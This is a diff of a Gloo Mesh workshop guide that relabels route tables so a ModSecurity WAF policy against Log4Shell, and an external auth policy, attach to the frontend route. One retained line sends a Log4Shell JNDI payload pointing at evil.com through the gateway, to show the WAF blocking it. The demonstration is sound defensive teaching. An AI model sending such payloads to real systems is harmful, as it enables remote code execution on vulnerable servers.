@@ -534,6 +534,8 @@ spec:
   workloadSelectors: []
   http:
     - name: frontend
+      labels:
+        virtual-destination: frontend
       forwardTo:
         destinations:
           - ref:
@@ -674,37 +676,11 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
 
-  * In the route table, the frontend route has the label `waf: "true"`. The WAF policy applies to routes with this same label.
+  * In the route table, the frontend route has the label `virtual-destination: frontend`. The WAF policy applies to routes with this same label.
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: frontend
-  namespace: web-team
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: ops-team
-      cluster: mgmt
-  workloadSelectors: []
-  http:
-    - name: frontend
-      labels:
-        waf: "true" ##### NOTE
-      forwardTo:
-        destinations:
-          - ref:
-              name: frontend
-              namespace: web-ui
-              cluster: cluster1
-            port:
-              number: 80
----
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -714,7 +690,7 @@ spec:
   applyToRoutes:
   - route:
       labels:
-        waf: "true" ##### NOTE
+        virtual-destination: frontend ##### NOTE
   config:
     disableCoreRuleSet: true
     customInterventionMessage: 'Log4Shell malicious payload'
@@ -833,40 +809,6 @@ The `ExtAuthPolicy` defines the provider connectivity including any callback pat
 
 ```sh
 ( echo "cat <<EOF" ; cat tracks/06-api-gateway/ext-auth-policy.yaml ; echo EOF ) | sh | kubectl apply -n web-team --context $MGMT -f -
-```
-
-Associating this `ExtAuthPolicy` with the gateway `RouteTable` will ensure that the policy is enforced.
-
-* Apply the `RouteTable`
-
-```sh
-kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: frontend
-  namespace: web-team
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: ops-team
-      cluster: mgmt
-  workloadSelectors: []
-  http:
-    - name: main-page
-      labels:
-        oauth: "true"
-      forwardTo:
-        destinations:
-          - ref:
-              name: frontend
-              namespace: web-ui
-              cluster: cluster1
-            port:
-              number: 80
-EOF
 ```
 
 Now if you refresh the application, you should be redirected to Keycloak to login.
